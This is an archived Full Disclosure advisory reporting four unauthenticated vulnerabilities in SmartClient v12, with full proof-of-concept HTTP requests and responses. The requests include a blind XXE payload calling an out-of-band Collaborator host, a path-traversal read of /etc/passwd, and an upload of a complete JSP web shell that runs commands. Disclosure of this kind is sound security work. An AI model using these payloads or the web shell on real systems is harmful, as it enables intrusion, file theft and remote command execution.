<!-- MHonArc v2.6.19 -->
<!--X-Head-End-->
<!DOCTYPE html>
<html lang="en">
<head>
<script async src="/site.js"></script>
<link rel="alternate" type="application/rss+xml" title="RSS" href="https://seclists.org/rss/fulldisclosure.rss">
<meta property="og:image" content="https://seclists.org/images/fulldisclosure-img.png" />
<link rel="image_src" href="https://seclists.org/images/fulldisclosure-img.png" />

<meta name="Subject" content="Multiple vulnerabilities in SmartClient_v12"/>
<meta name="Author" content="Red Team"/>
<title>Full Disclosure: Multiple vulnerabilities in SmartClient_v12</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="theme-color" content="#2A0D45">
<link rel="preload" as="image" href="/images/sitelogo.png" imagesizes="168px" imagesrcset="/images/sitelogo.png, /images/sitelogo-2x.png 2x">
<link rel="preload" as="image" href="/shared/images/nst-icons.svg">
<link rel="stylesheet" href="/shared/css/nst.css?v=2">
<script async src="/shared/js/nst.js?v=2"></script>
<link rel="stylesheet" href="/shared/css/nst-foot.css?v=2" media="print" onload="this.media='all'">
<link rel="stylesheet" href="/site.css">
<!--Google Analytics Code-->
<link rel="preload" href="https://www.google-analytics.com/analytics.js" as="script">
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
ga('create', 'UA-11009417-1', 'auto');
ga('send', 'pageview');
</script>
<!--END Google Analytics Code-->
<META NAME="ROBOTS" CONTENT="NOARCHIVE">
<link rel="shortcut icon" href="/shared/images/tiny-eyeicon.png" type="image/png">
</head>
<body><div id="nst-wrapper">

<div id="menu">
 <div class="blur">
  <header id="nst-head">

    <a id="menu-open" href="#menu" aria-label="Open menu">
     <img width="44" height="44" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#menu">
    </a>
    <a id="menu-close" href="#" aria-label="Close menu">
     <img width="44" height="44" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#close">
    </a>

   <a id="nst-logo" href="/" aria-label="Home page">
    <img alt="Home page logo" srcset="/images/sitelogo.png, /images/sitelogo-2x.png 2x" src="/images/sitelogo.png" onerror="this.onerror=null;this.srcset=this.src" height=90 width=168></a>

   <nav id="nst-gnav">
    <a class="nlink" href="https://nmap.org/">Nmap.org</a>
    <a class="nlink" href="https://npcap.com/">Npcap.com</a>
    <a class="nlink" href="https://seclists.org/">Seclists.org</a>
    <a class="nlink" href="https://sectools.org">Sectools.org</a>
    <a class="nlink" href="https://insecure.org/">Insecure.org</a>
   </nav>

   <form class="nst-search" id="nst-head-search" action="/search/">
    <input class="nst-search-q" name="q" type="search" placeholder="Site Search">
    <button class="nst-search-button" title="Search">
     <img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#search">
     </button>
   </form>

  </header>
 </div>
</div>

<main id="nst-content">

<!--X-Body-Begin-->
<!--X-User-Header-->
<a href="/fulldisclosure/"><img src="/images/fulldisclosure-logo.png" width="80" class="l-logo right" alt="fulldisclosure logo"></a>
<h2 class="m-list"><a href="/fulldisclosure/">Full Disclosure</a>
mailing list archives</h2>
<!--X-User-Header-End-->
<!--X-TopPNI-->
<div class="nav-bar">
<div class="nav-link">
<a href="17"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="date.html#18">By Date</a>
<a href="19"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<div class="nav-link">
<a href="16"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="index.html#18">By Thread</a>
<a href="19"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<form class="nst-search center" action="/search/fulldisclosure">
<input class="nst-search-q" name="q" type="search" placeholder="List Archive Search">
<button class="nst-search-button" title="Search">
<img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
src="/shared/images/nst-icons.svg#search">
</button>
</form>

</div>

<!--X-TopPNI-End-->
<!--X-MsgBody-->
<!--X-Subject-Header-Begin-->
<h1 class="m-title">Multiple vulnerabilities in SmartClient_v12</h1>
<hr>
<!--X-Subject-Header-End-->
<!--X-Head-of-Message-->


<em>From</em>: Red Team &lt;redteam () certimetergroup com&gt;<br>

<em>Date</em>: Tue, 18 Feb 2020 14:23:46 +0000<br>

<!--X-Head-of-Message-End-->
<!--X-Head-Body-Sep-Begin-->
<hr>
<!--X-Head-Body-Sep-End-->
<!--X-Body-of-Message-->
<pre style="margin: 0em;">Hello,

We are informing you about some vulnerabilities we found in SmartClient_v120.

1. Description
During an analysis on the Isomorphic Smartclient v12 LGPL version, we found multiple security flaws that are here 
described.
The application we tested  (SmartClient_v120p_2019-06-13_LGPL) can be downloaded from official website. 
(<a  rel="nofollow" href="https://www.smartclient.com/product/download.jsp">https://www.smartclient.com/product/download.jsp</a>)
As today is the latest version.

1) Information Disclosure on absolute path
The path “/tools/developerConsoleOperations.jsp” allows a user to test some functionalities. The server accepts in the 
_transaction parameter XML data and in the appID a valid name; The vulnerable functionality should be also reachable 
from /isomorphic/IDACall.
If a user makes a request on this path, the server replies with a verbose error showing where the application resides 
(his absolute path). This issue can be used by a malicious user to improve his knowledge about the environment and used 
for further attacks and to.
The path is reachable without any authentication by default.

2) XML External Entity on downloadWSDL
The path “/tools/developerConsoleOperations.jsp” allows a user to test some functionalities. The server accepts in the 
_transaction parameter XML data and in the appID a valid name.
A WSDL describes the structure of a SOAP webservice and is basically an XML file.
The isomorphic downloadWSDL functionality allows to download and verify a new WSDL (Web Services Description Language).
The WSDL document source of the document isn’t checked at all and an attacker can provide a malicious XML file to 
trigger a blind XXE vulnerability.
The path is reachable without any authentication by default.

Here there is the javadoc of the resource: 
<a  rel="nofollow" href="https://www.smartclient.com/smartgwtee-12.1/server/javadoc/com/isomorphic/rpc/BuiltinRPC.html#downloadWSDL-java.lang.String-java.lang.String-java.lang.String-com.isomorphic.rpc.RPCManager-javax.servlet.http.HttpServletRequest-javax.servlet.http.HttpServletResponse-">https://www.smartclient.com/smartgwtee-12.1/server/javadoc/com/isomorphic/rpc/BuiltinRPC.html#downloadWSDL-java.lang.String-java.lang.String-java.lang.String-com.isomorphic.rpc.RPCManager-javax.servlet.http.HttpServletRequest-javax.servlet.http.HttpServletResponse-</a>

3) Local File Inclusion on loadFile method
The Remote Procedure Call (RPC) ‘loadFile’ provided by the console functionality on the 
/tools/developerConsoleOperations.jsp URL is affected by an LFI issue; The vulnerable functionality should be also 
reachable from /isomorphic/IDACall.
It’s possible to tamper the elem tag in the XML contained in the _transaction POST parameter with a path traversal 
payload to exfiltrate arbitrary file from the file-system.
The path is reachable without any authentication by default.

Here there is the javadoc of the resource: 
<a  rel="nofollow" href="https://www.smartclient.com/smartgwtee-12.1/server/javadoc/com/isomorphic/rpc/BuiltinRPC.html#loadFile-java.lang.String-">https://www.smartclient.com/smartgwtee-12.1/server/javadoc/com/isomorphic/rpc/BuiltinRPC.html#loadFile-java.lang.String-</a>

4) Arbitrary File Upload on SaveFile that could lead to RCE
The Remote Procedure Call (RPC) ‘saveFile’ provided by the console functionality on the 
/tools/developerConsoleOperations.jsp URL allows a user to upload any file; The vulnerable functionality should be also 
reachable from /isomorphic/IDACall.
There isn’t any check on the file extension or its content.
The data accepted by the server code shouldn’t contain any characters that is used in the XML syntax like “&lt;”. This 
limit can be bypassed using the comment of the XML with “&lt;![CDATA[“.
The saved file can be reached inside the web-root with the name of the file used during the file upload.
Also, a file can be uploaded outside the web-root with a path traversal on the file system.
As a test we uploaded a file to /../../../../../../../../../../../tmp/test.txt. This allow an attacker to potentially 
rewrite system files, depending on the current user that execute isomorphic.
The path is reachable without any authentication by default.

Here there is the javadoc of the resource: 
<a  rel="nofollow" href="https://www.smartclient.com/smartgwtee-12.1/server/javadoc/com/isomorphic/rpc/BuiltinRPC.html#saveFile-java.lang.String-java.lang.String-">https://www.smartclient.com/smartgwtee-12.1/server/javadoc/com/isomorphic/rpc/BuiltinRPC.html#saveFile-java.lang.String-java.lang.String-</a>


2. Step to reproduce:
- Download the open source version of SmartClient 12.0 from: 
<a  rel="nofollow" href="https://www.smartclient.com/product/download-bounce.jsp?product=smartclient&amp;license=lgpl&amp;version=12.0p&amp;nightly=true">https://www.smartclient.com/product/download-bounce.jsp?product=smartclient&amp;license=lgpl&amp;version=12.0p&amp;nightly=true</a>
- Unzip the archive and navigate in smartclientSDK
- Run the script &quot;start_embedded_server.sh&quot;. A web server with an istance of smartclient will be at 
<a  rel="nofollow" href="http://localhost:8080">http://localhost:8080</a>
- Use the following payloads to trigger the vulnerabilities.


===========================================================================================================================================================================================
===========================================================================================================================================================================================

1) Information Disclosure on absolute path
POST /isomorphic/IDACall?isc_rpc=1&amp;isc_v=asd&amp;isc_tnum=3&amp;isc_dd=a HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 610
Origin: <a  rel="nofollow" href="http://localhost:8081">http://localhost:8081</a>
Connection: close
Referer: <a  rel="nofollow" href="http://localhost:8081/isomorphic/system/helpers/Log.html">http://localhost:8081/isomorphic/system/helpers/Log.html</a>
Cookie: 
GLog=%7B%0A%20%20%20%20isc_pageURL%3A%22http%3A//localhost%3A8081/docs/resources/explorer.html%22%2C%20%0A%20%20%20%20isc_pageGUID%3A%22BEF212E4-B94A-4030-B4C4-EFA951EFD204%22%2C%20%0A%20%20%20%20priorityDefaults%3A%7B%0A%20%20%20%20%20%20%20%20sgwtInternal%3A1%2C%20%0A%20%20%20%20%20%20%20%20Log%3A4%0A%20%20%20%20%7D%2C%20%0A%20%20%20%20defaultPriority%3A3%2C%20%0A%20%20%20%20left%3A0%2C%20%0A%20%20%20%20top%3A0%2C%20%0A%20%20%20%20width%3A996%2C%20%0A%20%20%20%20height%3A549%2C%20%0A%20%20%20%20trackRPC%3Anull%0A%7D;
 JSESSIONID=8CF7DFB620FA8D796DE055F83901909D
Upgrade-Insecure-Requests: 1

_transaction=&lt;transaction xmlns:xsi=&quot;<a  rel="nofollow" href="http://www.w3.org/2000/10/XMLSchema-instance&quot">http://www.w3.org/2000/10/XMLSchema-instance&quot</a>; 
xsi:type=&quot;xsd:Object&quot;&gt;&lt;transactionNum xsi:type=&quot;xsd:long&quot;&gt;5&lt;/transactionNum&gt;&lt;operations xsi:type=&quot;xsd:List&quot;&gt;&lt;elem 
xsi:type=&quot;xsd:Object&quot;&gt;&lt;appID&gt;XXXXXXX&lt;/appID&gt;&lt;className&gt;TEST&lt;/className&gt;&lt;methodName&gt;downloadWSDL&lt;/methodName&gt;&lt;arguments 
xsi:type=&quot;xsd:List&quot;&gt;&lt;elem&gt;<a  rel="nofollow" href="http://10.1.100.6:8000/test.xml">http://10.1.100.6:8000/test.xml</a>&lt;/elem&gt;&lt;elem&gt;xml&lt;/elem&gt;&lt;elem&gt;aaaaaa.xml&lt;/elem&gt;&lt;/arguments&gt;&lt;is_ISC_RPC_DMI
 
xsi:type=&quot;xsd:boolean&quot;&gt;true&lt;/is_ISC_RPC_DMI&gt;&lt;/elem&gt;&lt;/operations&gt;&lt;jscallback&gt;iframe&lt;/jscallback&gt;&lt;/transaction&gt;&amp;protocolVersion=1.0&amp;__iframeTarget__=isc_HiddenFrame_0

Response from server:
HTTP/1.1 200
Set-Cookie: JSESSIONID=41CEC8DFC7B8968C0D7EDCABB0A5924B; Path=/; HttpOnly
Cache-Control: no-cache
Pragma: no-cache
Expires: Wed, 02 Oct 2019 15:55:02 GMT
Content-Type: text/html;charset=UTF-8
Date: Wed, 02 Oct 2019 15:55:02 GMT
Connection: close
Content-Length: 874

&lt;HTML&gt;
&lt;BODY ONLOAD=&apos;var results = document.formResults.results.value;if (!(new 
RegExp(&quot;^(\\d{1,3}\\.){3}\\d{1,3}$&quot;).test(document.domain))) {while (!window.isc &amp;&amp; document.domain.indexOf(&quot;.&quot;) != -1 
) { try { parent.isc; break;} catch (e) {document.domain = document.domain.replace(/.*?\./, 
&quot;&quot;);}}}parent.isc.Comm.hiddenFrameReply(5,results)&apos;&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;FORM
 name=&apos;formResults&apos;&gt;&lt;TEXTAREA readonly name=&apos;results&apos;&gt;
//isc_RPCResponseStart--&gt;[{data:&quot;An error occurred when executing this operation on the server.\nException details are 
as follows:\n\njava.lang.Exception: Unable to locate XXXXXXX.app.xml - check to make sure it&apos;s available in 
/mnt/c/Users/XXXXXXX/Desktop/smartclient/SmartClient_v120p_2019-06-13_LGPL/smartclientSDK/shared/app&quot;,status:-1}]//isc_RPCResponseEnd&lt;/TEXTAREA&gt;&lt;/FORM&gt;
&lt;/BODY&gt;&lt;/HTML&gt;

===========================================================================================================================================================================================
===========================================================================================================================================================================================

2) XML External Entity on downloadWSDL
For this vulnerability, it&apos;s necessary create a local python server to get a valid blind xxe payload such as:
&lt;?xml version=&quot;1.0&quot; ?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY % ext SYSTEM &quot;<a  rel="nofollow" href="http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x&quot">http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x&quot</a>;&gt; %ext;
]&gt;
&lt;r&gt;&lt;/r&gt;

Save the payload in a file (e.g. xxe.xml) and start a python server: python -m SimpleHTTPServer 10000

Use this request to trigger the XXE:

POST /tools/developerConsoleOperations.jsp?isc_rpc=1&amp;isc_v=v12.0p_2019-06-13&amp;isc_tnum=13 HTTP/1.1
Host: 10.1.100.8:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 616
Connection: close
Upgrade-Insecure-Requests: 1

_transaction=&lt;transaction xmlns:xsi=&quot;<a  rel="nofollow" href="http://www.w3.org/2000/10/XMLSchema-instance&quot">http://www.w3.org/2000/10/XMLSchema-instance&quot</a>; 
xsi:type=&quot;xsd:Object&quot;&gt;&lt;transactionNum xsi:type=&quot;xsd:long&quot;&gt;13&lt;/transactionNum&gt;&lt;operations xsi:type=&quot;xsd:List&quot;&gt;&lt;elem 
xsi:type=&quot;xsd:Object&quot;&gt;&lt;appID&gt;isc_builtin&lt;/appID&gt;&lt;className&gt;builtin&lt;/className&gt;&lt;methodName&gt;downloadWSDL&lt;/methodName&gt;&lt;arguments
 
xsi:type=&quot;xsd:List&quot;&gt;&lt;elem&gt;<a  rel="nofollow" href="http://localhost:10000/xxe.xml">http://localhost:10000/xxe.xml</a>&lt;/elem&gt;&lt;elem&gt;xml&lt;/elem&gt;&lt;elem&gt;aaaaa&lt;/elem&gt;&lt;/arguments&gt;&lt;is_ISC_RPC_DMI
 
xsi:type=&quot;xsd:boolean&quot;&gt;true&lt;/is_ISC_RPC_DMI&gt;&lt;/elem&gt;&lt;/operations&gt;&lt;jscallback&gt;iframe&lt;/jscallback&gt;&lt;/transaction&gt;&amp;protocolVersion=1.0&amp;__iframeTarget__=isc_HiddenFrame_5

===========================================================================================================================================================================================
===========================================================================================================================================================================================

3) Local File Inclusion on loadFile method
With the following payload can be retrieved the &quot;/etc/passwd&quot;:

POST /isomorphic/IDACall?isc_rpc=1&amp;isc_v=asd&amp;isc_tnum=3&amp;isc_dd=a HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 686
Origin: <a  rel="nofollow" href="http://localhost:8081">http://localhost:8081</a>
Connection: close
Referer: <a  rel="nofollow" href="http://localhost:8081/isomorphic/system/helpers/Log.html">http://localhost:8081/isomorphic/system/helpers/Log.html</a>
Cookie: 
GLog=%7B%0A%20%20%20%20isc_pageURL%3A%22http%3A//localhost%3A8081/docs/resources/explorer.html%22%2C%20%0A%20%20%20%20isc_pageGUID%3A%22BEF212E4-B94A-4030-B4C4-EFA951EFD204%22%2C%20%0A%20%20%20%20priorityDefaults%3A%7B%0A%20%20%20%20%20%20%20%20sgwtInternal%3A1%2C%20%0A%20%20%20%20%20%20%20%20Log%3A4%0A%20%20%20%20%7D%2C%20%0A%20%20%20%20defaultPriority%3A3%2C%20%0A%20%20%20%20left%3A0%2C%20%0A%20%20%20%20top%3A0%2C%20%0A%20%20%20%20width%3A996%2C%20%0A%20%20%20%20height%3A549%2C%20%0A%20%20%20%20trackRPC%3Anull%0A%7D;
 JSESSIONID=8CF7DFB620FA8D796DE055F83901909D
Upgrade-Insecure-Requests: 1

_transaction=&lt;transaction+xmlns%3axsi%3d&quot;http%3a//www.w3.org/2000/10/XMLSchema-instance&quot;+xsi%3atype%3d&quot;xsd%3aObject&quot;&gt;&lt;transactionNum+xsi%3atype%3d&quot;xsd%3along&quot;&gt;3&lt;/transactionNum&gt;&lt;operations+xsi%3atype%3d&quot;xsd%3aList&quot;&gt;&lt;elem+xsi%3atype%3d&quot;xsd%3aObject&quot;&gt;&lt;appID&gt;isc_builtin&lt;/appID&gt;&lt;className&gt;builtin&lt;/className&gt;&lt;methodName&gt;loadFile&lt;/methodName&gt;&lt;arguments+xsi%3atype%3d&quot;xsd%3aList&quot;&gt;&lt;elem&gt;../../../../../../../../../../../../../../../../../../etc/passwd&lt;/elem&gt;&lt;elem&gt;xml&lt;/elem&gt;&lt;elem&gt;asd.xml&lt;/elem&gt;&lt;/arguments&gt;&lt;is_ISC_RPC_DMI+xsi%3atype%3d&quot;xsd%3aboolean&quot;&gt;true&lt;/is_ISC_RPC_DMI&gt;&lt;/elem&gt;&lt;/operations&gt;&lt;jscallback&gt;iframe&lt;/jscallback&gt;&lt;/transaction&gt;&amp;protocolVersion=1.0&amp;__iframeTarget__=isc_HiddenFrame_0

Response from server:
HTTP/1.1 200
Cache-Control: no-cache
Pragma: no-cache
Expires: Fri, 04 Oct 2019 13:48:05 GMT
Content-Type: text/html;charset=UTF-8
Date: Fri, 13 Sep 2019 13:48:05 GMT
Connection: close
Content-Length: 1615

&lt;HTML&gt;
&lt;BODY ONLOAD=&apos;var results = 
document.formResults.results.value;iframjje&apos;&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;FORM
 name=&apos;formResults&apos;&gt;&lt;TEXTAREA readonly name=&apos;results&apos;&gt;
//isc_RPCResponseStart--&gt;[{data:&quot;root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n<a  rel="nofollow" href="news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing</a>
 List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats 
Bug-Reporting System 
(admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:101:102:systemd
 Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nsystemd-network:x:102:103:systemd Network 
Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:103:104:systemd 
Resolver,,,:/run/systemd:/usr/sbin/nologin\nredTeamCMG:x:1000:1000:,,,:/home/XXXXXXXX:/bin/bash\nmessagebus:x:104:110::/nonexistent:/usr/sbin/nologin\n&quot;,status:0}]//isc_RPCResponseEnd&lt;/TEXTAREA&gt;&lt;/FORM&gt;
&lt;/BODY&gt;&lt;/HTML&gt;

===========================================================================================================================================================================================
===========================================================================================================================================================================================

4) Arbitrary File Upload on SaveFile that lead to RCE
POST /isomorphic/IDACall?isc_rpc=1&amp;isc_v=asd&amp;isc_tnum=3&amp;isc_dd=a HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 1440
Origin: <a  rel="nofollow" href="http://localhost:8081">http://localhost:8081</a>
Connection: close
Referer: <a  rel="nofollow" href="http://localhost:8081/isomorphic/system/helpers/Log.html">http://localhost:8081/isomorphic/system/helpers/Log.html</a>
Cookie: 
GLog=%7B%0A%20%20%20%20isc_pageURL%3A%22http%3A//localhost%3A8081/docs/resources/explorer.html%22%2C%20%0A%20%20%20%20isc_pageGUID%3A%22BEF212E4-B94A-4030-B4C4-EFA951EFD204%22%2C%20%0A%20%20%20%20priorityDefaults%3A%7B%0A%20%20%20%20%20%20%20%20sgwtInternal%3A1%2C%20%0A%20%20%20%20%20%20%20%20Log%3A4%0A%20%20%20%20%7D%2C%20%0A%20%20%20%20defaultPriority%3A3%2C%20%0A%20%20%20%20left%3A0%2C%20%0A%20%20%20%20top%3A0%2C%20%0A%20%20%20%20width%3A996%2C%20%0A%20%20%20%20height%3A549%2C%20%0A%20%20%20%20trackRPC%3Anull%0A%7D;
 JSESSIONID=8CF7DFB620FA8D796DE055F83901909D
Upgrade-Insecure-Requests: 1

_transaction=&lt;transaction+xmlns%3axsi%3d&quot;http%3a//www.w3.org/2000/10/XMLSchema-instance&quot;+xsi%3atype%3d&quot;xsd%3aObject&quot;&gt;&lt;transactionNum+xsi%3atype%3d&quot;xsd%3along&quot;&gt;5&lt;/transactionNum&gt;&lt;operations+xsi%3atype%3d&quot;xsd%3aList&quot;&gt;&lt;elem+xsi%3atype%3d&quot;xsd%3aObject&quot;&gt;&lt;appID&gt;isc_builtin&lt;/appID&gt;&lt;className&gt;builtin&lt;/className&gt;&lt;methodName&gt;saveFile&lt;/methodName&gt;&lt;arguments+xsi%3atype%3d&quot;xsd%3aList&quot;&gt;&lt;elem&gt;/shell.jsp&lt;/elem&gt;&lt;elem&gt;
&lt;![CDATA[+
&lt;%25%40+page+import%3d&quot;java.util.*,java.io.*&quot;%25&gt;
&lt;HTML&gt;&lt;BODY&gt;
&lt;FORM+METHOD%3d&quot;GET&quot;+NAME%3d&quot;myform&quot;+ACTION%3d&quot;&quot;&gt;
&lt;INPUT+TYPE%3d&quot;text&quot;+NAME%3d&quot;cmd&quot;&gt;
&lt;INPUT+TYPE%3d&quot;submit&quot;+VALUE%3d&quot;Send&quot;&gt;
&lt;/FORM&gt;
&lt;pre&gt;
&lt;%25
if+(request.getParameter(&quot;cmd&quot;)+!%3d+null)+{
++++++++out.println(&quot;Command%3a+&quot;+%2b+request.getParameter(&quot;cmd&quot;)+%2b+&quot;&lt;BR&gt;&quot;)%3b
++++++++Process+p+%3d+Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;))%3b
++++++++OutputStream+os+%3d+p.getOutputStream()%3b
++++++++InputStream+in+%3d+p.getInputStream()%3b
++++++++DataInputStream+dis+%3d+new+DataInputStream(in)%3b
++++++++String+disr+%3d+dis.readLine()%3b
++++++++while+(+disr+!%3d+null+)+{
++++++++++++++++out.println(disr)%3b+
++++++++++++++++disr+%3d+dis.readLine()%3b+
++++++++++++++++}
++++++++}
%25&gt;
&lt;/pre&gt;
&lt;/BODY&gt;&lt;/HTML&gt;
]]&gt;
&lt;/elem&gt;&lt;/arguments&gt;&lt;is_ISC_RPC_DMI+xsi%3atype%3d&quot;xsd%3aboolean&quot;&gt;true&lt;/is_ISC_RPC_DMI&gt;&lt;/elem&gt;&lt;/operations&gt;&lt;jscallback&gt;iframjje&lt;/jscallback&gt;&lt;/transaction&gt;&amp;protocolVersion=1.0&amp;__iframeTarget__=isc_HiddenFrame_0

Response from server:
HTTP/1.1 200
Cache-Control: no-cache
Pragma: no-cache
Expires: Fri, 04 Oct 2019 13:59:05 GMT
Content-Type: text/html;charset=UTF-8
Date: Fri, 13 Sep 2019 13:59:05 GMT
Connection: close
Content-Length: 352

&lt;HTML&gt;
&lt;SCRIPT&gt;document.domain = &apos;a&apos;;&lt;/SCRIPT&gt;
&lt;BODY ONLOAD=&apos;var results = 
document.formResults.results.value;iframjje&apos;&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;&lt;FORM
 name=&apos;formResults&apos;&gt;&lt;TEXTAREA readonly name=&apos;results&apos;&gt;
//isc_RPCResponseStart--&gt;[{data:null,status:0}]//isc_RPCResponseEnd&lt;/TEXTAREA&gt;&lt;/FORM&gt;
&lt;/BODY&gt;&lt;/HTML&gt;

After upload navigate to <a  rel="nofollow" href="http://local_smartclient:PORT/shell.jsp?cmd=whoami">http://local_smartclient:PORT/shell.jsp?cmd=whoami</a>

===========================================================================================================================================================================================
===========================================================================================================================================================================================

Timeline
- 29/10/2019 Sent the first email to developers (info[at]smartclient.com, support[at]smartclient.com). No response.
- 05/11/2019 Sent the second email to developers (info[at]smartclient.com, support[at]smartclient.com). No response.
- 18/02/2020 Issues published on seclist.org

--
RedTeam

Certimeter Group
Corso Svizzera, 185 - 10149 - Torino
Piazza IV Novembre, 4 - 20124 - Milano
Tel +39 011 7741894
www.certimetergroup.com

_______________________________________________
Sent through the Full Disclosure mailing list
<a  rel="nofollow" href="https://nmap.org/mailman/listinfo/fulldisclosure">https://nmap.org/mailman/listinfo/fulldisclosure</a>
Web Archives &amp; RSS: <a  rel="nofollow" href="http://seclists.org/fulldisclosure/">http://seclists.org/fulldisclosure/</a>

</pre>
<!--X-Body-of-Message-End-->
<!--X-MsgBody-End-->
<!--X-Follow-Ups-->
<hr>
<!--X-Follow-Ups-End-->
<!--X-References-->
<!--X-References-End-->
<!--X-BotPNI-->
<div class="nav-bar">
<div class="nav-link">
<a href="17"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="date.html#18">By Date</a>
<a href="19"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<div class="nav-link">
<a href="16"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="index.html#18">By Thread</a>
<a href="19"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
</div>
<h3 class="m-thread">Current thread:</h3>
<ul class="thread">
<li><strong>Multiple vulnerabilities in SmartClient_v12</strong> <em>Red Team (Feb 18)</em>
</ul>


<!--X-BotPNI-End-->
<!--X-User-Footer-->
<!--X-User-Footer-End-->
</main><!-- content -->

<footer id="nst-foot">
   <form class="nst-search" id="nst-foot-search" action="/search/">
    <input class="nst-search-q" name="q" type="search" placeholder="Site Search">
    <button class="nst-search-button" title="Search">
     <img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#search">
     </button>
   </form>
<div class="flexlists">
<div class="fl-unit">
<h2><a class="nlink" href="https://nmap.org/">Nmap Security Scanner</a></h2>
<ul>
<li><a class="nlink" href="https://nmap.org/book/man.html">Ref Guide</a>
